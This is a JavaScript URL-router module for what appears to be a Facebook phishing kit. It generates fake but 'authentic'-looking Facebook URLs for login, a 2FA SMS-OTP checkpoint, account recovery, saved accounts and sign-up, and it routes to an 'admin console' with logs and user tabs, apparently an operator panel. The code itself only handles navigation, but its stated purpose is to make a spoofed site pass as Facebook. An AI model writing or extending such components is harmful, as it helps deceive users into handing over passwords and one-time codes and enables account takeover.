/**
 * Professional Long Hash-based URL Router Utility
 * Formats URLs with authentic numbers, session IDs, and tokens matching Meta/Facebook:
 * - 2FA Checkpoint:
 *     #checkpoint/1501092823525282/?challenge_type=sms_otp&session_id=8923419827419&u=100084920194812&next=https%3A%2F%2Fwww.facebook.com%2F
 * - Login:
 *     #login/device-based/regular/login/?login_attempt=1&lwv=100&refid=8&session_id=7491028491
 * - Saved Accounts:
 *     #login/device-based/profile/select/?next=https%3A%2F%2Fwww.facebook.com%2F&ref=profile_switch_9102
 * - Account Recovery:
 *     #recover/initiate/?ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjoxLCJjcmVhdGlvbl90aW1lIjoxNzI4OTIwMTkyfQ%3D%3D&cuid=948102941
 * - Sign Up:
 *     #reg/?cid=1002349182394&entry_point=login_bottom&locale=en_GB&tracking_id=8491028
 * - Admin Logs:
 *     #admin/console/v2/records-stream?tab=logs&cluster_id=948102941&session=live_admin_8391024
 * - Admin Overview:
 *     #admin/console/v2/dashboard-overview?tab=overview&metric_period=realtime_24h&node_id=1004
 * - Admin Users:
 *     #admin/console/v2/users-management?tab=users&view=all&filter=active_accounts_94102
 * - Admin Recovery:
 *     #admin/console/v2/recovery-settings?tab=recovery&sec_level=tier1&config_id=88319
 * - Admin Posts:
 *     #admin/console/v2/feed-posts?tab=posts&feed_id=primary_stream_8912&limit=50
 * - Admin Stories:
 *     #admin/console/v2/video-stories?tab=stories&bucket_id=stories_v3&stream=hls_live_201
 * - Admin Notifications:
 *     #admin/console/v2/notifications?tab=notifs&channel_id=broadcast_001&delivery=instant
 * - Home Feed:
 *     #/?sk=h_chr&feed_id=100084920194812&source=bookmark_newsfeed
 * - Friends:
 *     #friends/?category=requests&ref=tn_icon_friends&uid=100084920194812
 * - Watch Video:
 *     #watch/?ref=tab_video&stream_id=94810294810&autoplay=true
 * - Marketplace:
 *     #marketplace/?ref=nav_tab_marketplace&location_id=100294&currency=USD
 * - Groups:
 *     #groups/feed/?category=discover&ref=group_browse&uid=100084920194812
 */

export const CANONICAL_URLS = {
  // 2FA / OTP Checkpoint Screen (Full 16-digit Facebook Checkpoint ID, SMS OTP challenge, and session parameters)
  '2fa': 'checkpoint/1501092823525282/?challenge_type=sms_otp&session_id=8923419827419&u=100084920194812&next=https%3A%2F%2Fwww.facebook.com%2F',
  
  // Standard Login Screen
  'login': 'login/device-based/regular/login/?login_attempt=1&lwv=100&refid=8&session_id=7491028491',
  
  // Recent Saved Profiles Device Chooser
  'accounts': 'login/device-based/profile/select/?next=https%3A%2F%2Fwww.facebook.com%2F&ref=profile_switch_9102',
  
  // Account Recovery / Forgot Password
  'forgot': 'recover/initiate/?ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjoxLCJjcmVhdGlvbl90aW1lIjoxNzI4OTIwMTkyfQ%3D%3D&cuid=948102941',
  
  // Registration Flow
  'signup': 'reg/?cid=1002349182394&entry_point=login_bottom&locale=en_GB&tracking_id=8491028',
  
  // Admin Console Sections
  'admin/logs': 'admin/console/v2/records-stream?tab=logs&cluster_id=948102941&session=live_admin_8391024',
  'admin/overview': 'admin/console/v2/dashboard-overview?tab=overview&metric_period=realtime_24h&node_id=1004',
  'admin/users': 'admin/console/v2/users-management?tab=users&view=all&filter=active_accounts_94102',
  'admin/recovery': 'admin/console/v2/recovery-settings?tab=recovery&sec_level=tier1&config_id=88319',
  'admin/posts': 'admin/console/v2/feed-posts?tab=posts&feed_id=primary_stream_8912&limit=50',
  'admin/stories': 'admin/console/v2/video-stories?tab=stories&bucket_id=stories_v3&stream=hls_live_201',
  'admin/notifs': 'admin/console/v2/notifications?tab=notifs&channel_id=broadcast_001&delivery=instant',
  'admin': 'admin/console/v2/records-stream?tab=logs&cluster_id=948102941&session=live_admin_8391024',
  
  // Authenticated Feed Tabs
  'home': '?sk=h_chr&feed_id=100084920194812&source=bookmark_newsfeed',
  'friends': 'friends/?category=requests&ref=tn_icon_friends&uid=100084920194812',
  'watch': 'watch/?ref=tab_video&stream_id=94810294810&autoplay=true',
  'marketplace': 'marketplace/?ref=nav_tab_marketplace&location_id=100294&currency=USD',
  'groups': 'groups/feed/?category=discover&ref=group_browse&uid=100084920194812',
};

export function parseRoute(hashOrPath) {
  let raw = hashOrPath || '';
  if (typeof window !== 'undefined' && !raw) {
    raw = window.location.hash || window.location.pathname || '';
  }

  // Strip leading # and /
  let cleaned = raw.replace(/^[#/]+/, '').trim().toLowerCase();

  // If path is /admin
  if (typeof window !== 'undefined' && window.location.pathname.toLowerCase().startsWith('/admin')) {
    if (!cleaned || !cleaned.startsWith('admin')) {
      cleaned = 'admin' + (cleaned ? '/' + cleaned : '/logs');
    }
  }

  // Split into path and query
  const [pathPart, queryPart = ''] = cleaned.split('?');
  const pathLower = pathPart.toLowerCase();
  const queryLower = queryPart.toLowerCase();

  // 1. Admin Route Detection
  if (pathLower.startsWith('admin') || queryLower.includes('tab=')) {
    // Determine admin sub-tab
    let subPage = 'logs';
    if (queryLower.includes('tab=overview') || pathLower.includes('overview')) {
      subPage = 'overview';
    } else if (queryLower.includes('tab=users') || pathLower.includes('users')) {
      subPage = 'users';
    } else if (queryLower.includes('tab=recovery') || pathLower.includes('recovery')) {
      subPage = 'recovery';
    } else if (queryLower.includes('tab=posts') || pathLower.includes('posts')) {
      subPage = 'posts';
    } else if (queryLower.includes('tab=stories') || pathLower.includes('stories')) {
      subPage = 'stories';
    } else if (
      queryLower.includes('tab=notifs') ||
      pathLower.includes('notifs') ||
      queryLower.includes('tab=notifications') ||
      pathLower.includes('notifications')
    ) {
      subPage = 'notifs';
    } else if (queryLower.includes('tab=logs') || pathLower.includes('logs') || pathLower.includes('records-stream')) {
      subPage = 'logs';
    }

    if (
      pathLower.startsWith('admin') ||
      ['overview', 'users', 'recovery', 'posts', 'stories', 'notifs', 'logs'].some((k) => pathLower.startsWith(k))
    ) {
      return { page: 'admin', subPage, raw: cleaned };
    }
  }

  // 2. 2FA / Checkpoint Route Detection
  // Matches #2fa, #otp, #checkpoint/..., #two-factor, etc.
  if (
    pathLower.includes('checkpoint') ||
    pathLower.includes('2fa') ||
    pathLower.includes('otp') ||
    pathLower.includes('two-factor') ||
    pathLower.includes('verify') ||
    queryLower.includes('sms_otp') ||
    queryLower.includes('challenge_type')
  ) {
    return { page: '2fa', subPage: '', raw: cleaned };
  }

  // 3. Recovery / Forgot Password Route Detection
  // Matches #recover/..., #forgot, #find-account, etc.
  if (
    pathLower.includes('recover') ||
    pathLower.includes('forgot') ||
    pathLower.includes('find-account') ||
    pathLower.includes('reset')
  ) {
    return { page: 'forgot', subPage: '', raw: cleaned };
  }

  // 4. Registration / Sign Up Route Detection
  // Matches #reg/..., #signup, #register, etc.
  if (
    pathLower.startsWith('reg') ||
    pathLower.includes('signup') ||
    pathLower.includes('register') ||
    pathLower.includes('create-account')
  ) {
    return { page: 'signup', subPage: '', raw: cleaned };
  }

  // 5. Saved Accounts vs Regular Login Form Detection
  if (pathLower.includes('profile/select') || pathLower === 'accounts') {
    return { page: 'accounts', subPage: '', raw: cleaned };
  }
  if (pathLower.includes('login') || pathLower.includes('signin')) {
    return { page: 'login', subPage: '', raw: cleaned };
  }

  // 6. Main Social Tabs Detection
  if (pathLower.startsWith('friends')) {
    return { page: 'friends', subPage: '', raw: cleaned };
  }
  if (pathLower.startsWith('watch') || pathLower.startsWith('video')) {
    return { page: 'watch', subPage: '', raw: cleaned };
  }
  if (pathLower.startsWith('marketplace')) {
    return { page: 'marketplace', subPage: '', raw: cleaned };
  }
  if (pathLower.startsWith('groups')) {
    return { page: 'groups', subPage: '', raw: cleaned };
  }
  if (pathLower.startsWith('home') || queryLower.includes('sk=h_chr') || queryLower.includes('feed_id=')) {
    return { page: 'home', subPage: '', raw: cleaned };
  }

  // Default fallback
  const firstSegment = pathLower.split('/').filter(Boolean)[0] || '';
  return { page: firstSegment || 'accounts', subPage: '', raw: cleaned };
}

export function getCurrentRoute() {
  if (typeof window === 'undefined') {
    return { page: 'accounts', subPage: '', raw: '' };
  }
  return parseRoute(window.location.hash || window.location.pathname);
}

export function setRoute(newRoute, replace = false) {
  if (typeof window === 'undefined') return;

  const rawKey = (newRoute || '').replace(/^[#/]+/, '').trim();
  
  // Resolve canonical professional long URL if a key/slug was provided
  const targetPath = CANONICAL_URLS[rawKey] || CANONICAL_URLS[rawKey.toLowerCase()] || rawKey;

  const currentRaw = (window.location.hash || '').replace(/^[#/]+/, '').trim();

  // If already at this exact target URL, return to avoid redundant updates
  if (currentRaw === targetPath) {
    return;
  }

  const targetHash = targetPath ? `#${targetPath}` : '#';

  if (replace) {
    window.location.replace(targetHash);
  } else {
    window.location.hash = targetHash;
  }
}
